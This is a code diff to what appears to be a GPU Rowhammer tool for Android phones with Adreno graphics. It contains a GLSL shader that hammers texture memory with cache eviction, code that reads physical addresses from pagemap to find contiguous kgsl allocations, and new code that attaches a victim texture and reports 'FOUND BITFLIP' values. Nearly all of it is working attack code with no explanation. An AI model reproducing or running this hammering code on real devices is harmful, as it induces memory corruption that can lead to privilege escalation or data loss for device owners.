@@ -85,13 +85,13 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"uniform sampler2D evict1;\n" //  has size of 64 regular pages, needed to evict caches
 	"out vec4 FragColor;\n"
 	"void main(){\n"
+	"	int id = int(threadD.x) % 10;\n"
+	"	id = id * 4096;\n"
 	"	for(int i = 0; i < 2000000; ++i){\n"
 	"		for(int j = 0; j < 64; ++j){\n"
 	"			FragColor = texelFetch(row1, ivec2(j * 16 % 32, j * int(16 / 32)), 0);\n"
 	"			FragColor = texelFetch(row2, ivec2(j * 16 % 32, j * int(16 / 32)), 0);\n"
 	"		}\n"
-	"		int id = int(threadD.x) % 8;\n"
-	"		id = id * 4096;\n"
 	"		FragColor = texelFetch(evict1, ivec2(id % 256, int(id / 256)), 0);\n"
 	"		FragColor = texelFetch(evict1, ivec2(id % 256 + 32, int(id / 256)), 0);\n"
 	"	}\n"
@@ -275,7 +275,7 @@ int main(){
 	glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
 	ttmp = ttmp + rndX + rndY;
 	glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 256, 256, 0, GL_RGBA, GL_UNSIGNED_BYTE, NULL);
-	glTexSubImage2D(GL_TEXTURE_2D, 0, rndX, rndY, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &ttmp);
+	//glTexSubImage2D(GL_TEXTURE_2D, 0, rndX, rndY, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &ttmp);
 	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);	
 	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);
 	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);
@@ -287,7 +287,7 @@ int main(){
 		glBindTexture(GL_TEXTURE_2D, tex2[i]);
 		ttmp = ttmp + rndX + rndY; // in case of deduplication (currently not implemented in Android) ...
 		glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 32, 32, 0, GL_RGBA, GL_UNSIGNED_BYTE, textures_data);
-		glTexSubImage2D(GL_TEXTURE_2D, 0, rndX, rndY, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &ttmp);
+		//glTexSubImage2D(GL_TEXTURE_2D, 0, rndX, rndY, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &ttmp);
 		glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);	
 		glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);
 		glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);
@@ -304,17 +304,17 @@ int main(){
 	glBindTexture(GL_TEXTURE_2D, tex2[0]);
 	glDrawArrays(GL_POINTS, 0, 1);
 
-	unsigned int* frame  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
-	memset(frame, 0x00, 32 * 32 * sizeof(unsigned int));
-	glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame);
-	printf("READVALS: \n");
-	for(int  i = 0; i < 32; ++i){
-		for( int j = 0; j < 32; ++j){
-			printf("%2d ", frame[i * 32 + j]);
+	//unsigned int* frame  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
+	//memset(frame, 0x00, 32 * 32 * sizeof(unsigned int));
+	//glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame);
+	//printf("READVALS: \n");
+	//for(int  i = 0; i < 32; ++i){
+	//	for( int j = 0; j < 32; ++j){
+		//	printf("%2d ", frame[i * 32 + j]);
 				
-		}
-		printf("\n");
-	}
+	//	}
+	//	printf("\n");
+	//}
 
 	
 	// STAGE #2
@@ -333,11 +333,11 @@ int main(){
 		// we have texture
 		kgsl_cur.kgsl_pa = (void*)read_entry(pagemap_f, (void*)kgsl_cur.kgsl_va);
 		
-		fprintf(kgsl_csv,"%p,%p,%lu,%u,", kgsl_cur.kgsl_gpu_va, kgsl_cur.kgsl_va, kgsl_cur.kgsl_size, kgsl_cur.kgsl_id);
-                fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_flags);
-                fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_type);
-                fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_usage);
-                fprintf(kgsl_csv,"%lu\n", kgsl_cur.kgsl_sglen);
+		//fprintf(kgsl_csv,"%p,%p,%lu,%u,", kgsl_cur.kgsl_gpu_va, kgsl_cur.kgsl_pa, kgsl_cur.kgsl_size, kgsl_cur.kgsl_id);
+                //fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_flags);
+                //fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_type);
+                //fprintf(kgsl_csv,"%s,", kgsl_cur.kgsl_usage);
+                //fprintf(kgsl_csv,"%lu\n", kgsl_cur.kgsl_sglen);
 		
 		struct kgsl_entry** kgsl_ptr = &kgsl_arr;		
 		while(*kgsl_ptr){
@@ -367,11 +367,11 @@ int main(){
 				while (counter2 >>= 1) ++target_level;
 				//fprintf(progout, "NEW GROUP OF TEXTURES: \n");
 				kgsl_result[cont_kgsls++] = first;
-				for(int i = 0; i < counter; ++i){
-					kgsl_cur = *first;
-					fprintf(progout, "mike,%d,%p,%p,%d\n", kgsl_cur.kgsl_id, kgsl_cur.kgsl_va, kgsl_cur.kgsl_pa, target_level); // only looks for order == 6
-					first = first->kgsl_next;
-				}
+				//for(int i = 0; i < counter; ++i){
+				//	kgsl_cur = *first;
+				//	fprintf(progout, "mike,%d,%p,%p,%d\n", kgsl_cur.kgsl_id, kgsl_cur.kgsl_va, kgsl_cur.kgsl_pa, target_level); // only looks for order == 6
+				//	first = first->kgsl_next;
+				//}
 				++result;
 			}
 			counter = 1;
@@ -435,7 +435,7 @@ int main(){
 		glClear(GL_COLOR_BUFFER_BIT);
 		glUseProgram(shaderProgram2);
 		glVertexAttribPointer(0, 10, GL_INT, GL_FALSE, 3 * sizeof(int), (void*)0);
-    	glEnableVertexAttribArray(0);
+	    	glEnableVertexAttribArray(0);
 
 		// Binding textures
 		GLuint row1TexLocation = glGetUniformLocation(shaderProgram, "row1");
@@ -457,8 +457,22 @@ int main(){
 		glActiveTexture(GL_TEXTURE0 + 2); // eviction Texture Unit
 		glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
 		printf("Trying to hammer chunk %d\n", i);
+		glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, victim->kgsl_id, 0);
 		// running the program
 		glDrawArrays(GL_POINTS, 0, 1);
+		unsigned int* frame2  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
+		memset(frame2, 0x00, 32 * 32 * sizeof(unsigned int));
+		glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
+		printf("READVALS: \n");
+		for(int  i = 0; i < 32; ++i){
+			for( int j = 0; j < 32; ++j){
+				if(frame2[i * 32 + j] != 0xffffffff)
+					printf("FOUND BITFLIP %x\n", frame2[i * 32 + j]);
+			//	else
+			//		printf("NO BITFLIP %x\n", frame2[i * 32 + j]);	
+			}
+		} 
+		free(frame2);
 		
 	}	
 	printf("RESULT NUMBER IS %u\n", cont_kgsls);
